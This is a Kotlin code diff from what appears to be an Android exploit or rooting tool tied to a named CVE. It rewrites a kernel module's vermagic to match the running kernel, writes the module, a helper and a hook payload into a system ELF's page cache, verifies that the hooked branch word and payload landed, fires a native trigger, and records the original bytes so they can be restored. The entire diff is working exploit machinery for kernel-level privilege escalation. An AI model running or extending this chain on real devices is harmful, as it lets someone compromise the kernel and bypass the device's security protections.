@@ -8,6 +8,8 @@ import com.ghostlock.app.engine.pagecache.LkmImagePatch
 import com.ghostlock.app.engine.pagecache.LkmSelector
 import com.ghostlock.app.engine.pagecache.write.BlockWriter
 import com.ghostlock.app.jni.cve43284.CarrierCandidates
+import com.ghostlock.app.jni.cve43284.ModulePrecheck43284
+import com.ghostlock.app.jni.cve43284.ModuleVermagic43284
 import com.ghostlock.app.jni.cve43284.NativeHelper
 import java.io.RandomAccessFile
 
@@ -64,7 +66,52 @@ object StageConfigProvider {
         val modulePatched = modulePatcher?.invoke(moduleRaw)
             ?: LkmImagePatch.apply(moduleRaw, scriptFile.absolutePath, log)
         log.debug("StageConfigProvider.create", "module-patched", "bytes" to modulePatched.size)
-        val module = modulePatched.copyOf((modulePatched.size + 15) / 16 * 16)
+        val release = android.system.Os.uname().release
+        val original = when (val check = ModulePrecheck43284.check(modulePatched)) {
+            is ModulePrecheck43284.Precheck.Ok -> check.vermagic
+            else -> {
+                log.error("LKM module precheck failed", check.javaClass.simpleName)
+                writer.close(); sa.close(); return null
+            }
+        }
+        val suffix = original.substringAfter(' ', "")
+        val required = release + if (suffix.isEmpty()) "" else " " + suffix
+        if (required.isEmpty()) {
+            log.error("LKM vermagic unavailable", "vermagic-release")
+            writer.close(); sa.close(); return null
+        }
+        val retagged = when (val rewritten = ModuleVermagic43284.rewrite(modulePatched, required)) {
+            is ModuleVermagic43284.RewriteResult.Rewritten -> rewritten.bytes
+            is ModuleVermagic43284.RewriteResult.SlotTooSmall -> {
+                log.error("LKM vermagic slot too small", "vermagic-slot")
+                writer.close(); sa.close(); return null
+            }
+            ModuleVermagic43284.RewriteResult.MissingModinfo -> {
+                log.error("LKM vermagic missing", "vermagic-missing")
+                writer.close(); sa.close(); return null
+            }
+            ModuleVermagic43284.RewriteResult.BadElf -> {
+                log.error("LKM vermagic ELF invalid", "vermagic-elf")
+                writer.close(); sa.close(); return null
+            }
+        }
+        when (val precheck = ModulePrecheck43284.check(retagged)) {
+            is ModulePrecheck43284.Precheck.Ok -> {
+                if (precheck.vermagic != required) {
+                    log.error("LKM vermagic mismatch", "vermagic-mismatch")
+                    writer.close(); sa.close(); return null
+                }
+                log.debug(
+                    "StageConfigProvider.create", "vermagic-ok",
+                    "name" to precheck.name, "vermagic" to precheck.vermagic,
+                )
+            }
+            else -> {
+                log.error("LKM module precheck failed", precheck.javaClass.simpleName)
+                writer.close(); sa.close(); return null
+            }
+        }
+        val module = retagged.copyOf((retagged.size + 15) / 16 * 16)
         val target = ElfTargetReader.read(TARGET, log = log) ?: run {
             log.debug("StageConfigProvider.create", "target-missing", "path" to TARGET)
             writer.close(); sa.close(); return null
@@ -111,9 +158,10 @@ object StageConfigProvider {
             "stage" to stageOriginal.size, "helper" to helperOriginal.size,
             "module" to module.size)
         val ledger = RestoreLedger(log)
-        ledger.record(TARGET, blockStart, siteOriginal)
-        ledger.record(TARGET, plan.landingFile, stageOriginal)
+        /* Recorded helper→stage→site so reverse restore is DFRoot's site→stage→helper. */
         ledger.record(CRASH_DUMP, 0, helperOriginal)
+        ledger.record(TARGET, plan.landingFile, stageOriginal)
+        ledger.record(TARGET, blockStart, siteOriginal)
 
         var sequence = 1
         val helperSpec = WriteSpec(
@@ -124,13 +172,16 @@ object StageConfigProvider {
         val moduleSpec = WriteSpec(
             carrier.path, module, sa.aesKey, sequence,
             verify = {
-                NativeHelper.read(carrier.path, 0L)?.contentEquals(module.copyOf(16)) == true
+                val first = NativeHelper.read(carrier.path, 0L)
+                val last = NativeHelper.read(carrier.path, (module.size - 16).toLong())
+                first?.contentEquals(module.copyOf(16)) == true &&
+                    last?.contentEquals(module.copyOfRange(module.size - 16, module.size)) == true
             },
             viaHelper = true,
         )
         sequence += module.size / 16
         val hookSpec = HookSpec(TARGET, plan, payload, sa.aesKey, sequence) {
-            writer.readBlock(TARGET, plan.siteFile - plan.siteFile % 16L)
+            val siteOk = writer.readBlock(TARGET, plan.siteFile - plan.siteFile % 16L)
                 ?.let { block ->
                     val at = (plan.siteFile % 16L).toInt()
                     val word = (block[at].toInt() and 0xFF) or
@@ -139,7 +190,15 @@ object StageConfigProvider {
                         ((block[at + 3].toInt() and 0xFF) shl 24)
                     word == plan.branchWord
                 } == true
+            val first = writer.readBlock(TARGET, plan.landingFile)
+            val last = writer.readBlock(TARGET, plan.landingFile + payload.size - 16)
+            siteOk &&
+                first?.contentEquals(payload.copyOf(16)) == true &&
+                last?.contentEquals(payload.copyOfRange(payload.size - 16, payload.size)) == true
         }
+        /* HookStage writes payload + one site block; cleanup must use fresh ESP
+         * sequence numbers, not replay the hook's sequence. */
+        sequence += payload.size / 16 + 1
 
         val restore: suspend () -> Boolean = {
             log.verbose("StageConfigProvider.restore", "sequence" to sequence)
@@ -150,16 +209,20 @@ object StageConfigProvider {
             ok
         }
 
+        val kmi = LkmSelector.label(log = log) ?: "android13-5.15"
         val config = StageConfig(
-            environment = EnvironmentInput("android13-5.15", carrier.path, sa.spi, sa.aesKey, ByteArray(32)),
+            environment = EnvironmentInput(kmi, carrier.path, sa.spi, sa.aesKey, ByteArray(32)),
             block = writer,
             helper = helperSpec,
             module = moduleSpec,
             hook = hookSpec,
-            waitPaths = listOf("/dev/df"),
-            trigger = { NativeHelper.triggerOrphan(500) },
+            waitPaths = listOf("/dev/dfm6"),
+            failPaths = listOf("/dev/dfme2"),
+            waitTimeoutMs = 10_000,
+            trigger = { NativeHelper.triggerOrphan(1000) },
             restore = restore,
             log = log,
+            waitSince = System.currentTimeMillis(),
         )
         StageSession(config, { writer.close(); sa.close() }, log)
     }.onFailure { failure ->
